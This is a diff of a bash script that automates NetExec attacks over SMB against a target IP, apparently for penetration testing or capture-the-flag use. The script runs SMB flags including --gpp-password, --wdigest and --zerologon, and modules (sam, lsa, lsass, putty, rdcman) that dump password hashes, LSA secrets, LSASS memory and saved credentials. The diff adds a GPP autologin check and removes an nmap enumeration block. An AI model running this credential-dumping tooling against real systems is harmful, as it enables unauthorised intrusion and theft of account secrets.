@@ -35,7 +35,7 @@ have_flag(){ grep -q -- "$1" <<<"$HELP"; }
 have_mod(){ nxc smb -L 2>/dev/null | awk '{print $1}' | sed 's/^-//' | grep -q "^$1$"; }
 
 ## 1) SMB recon (per-flag, clear output)
-for f in --shares --users --pass-pol --loggedon-users --qwinsta --wdigest --gpp-password --zerologon; do
+for f in --shares --users --pass-pol --loggedon-users --qwinsta --wdigest --gpp-password --gpp_autologin --zerologon; do
   if have_flag "$f"; then
     log "Now running SMB flag: $f"
     nxc smb "$IP" "${BASE[@]}" "$f" || true
@@ -75,9 +75,9 @@ if have_flag "--dpapi"; then
   fi
 fi
 
-## 3) Modules (auto-detected)
+## 3) Modules
 NOT_AVAILABLE=()
-for m in spider_plus sam lsa lsass putty backup_operator ldapi rdcman; do
+for m in spider_plus sam lsa lsass putty backup_operator rdcman; do
   if have_mod "$m"; then
     log "Module: $m"
     nxc smb "$IP" "${BASE[@]}" -M "$m" || true
@@ -87,18 +87,7 @@ for m in spider_plus sam lsa lsass putty backup_operator ldapi rdcman; do
 done
 
 if [[ ${#NOT_AVAILABLE[@]} -gt 0 ]]; then
-  log "Modules not supported by this nxc build (or need --local-auth/admin): ${NOT_AVAILABLE[*]}"
-fi
-
-
-## 4) (Optional) Nmap helpers
-if command -v nmap >/dev/null; then
-  log "Nmap: smb-enum-shares,smb-enum-users,smb-os-discovery"
-  nmap -p445 --script smb-enum-shares,smb-enum-users,smb-os-discovery "$IP" || true
-  log "Nmap: smb-security-mode"
-  nmap -p445 --script smb-security-mode "$IP" || true
-  log "Nmap: smb-protocols"
-  nmap -p445 --script smb-protocols "$IP" || true
+  log "Modules not supported by this nxc build (or need --local-auth i.e: remove the -d): ${NOT_AVAILABLE[*]}"
 fi
 
 # Final notes (printed only)
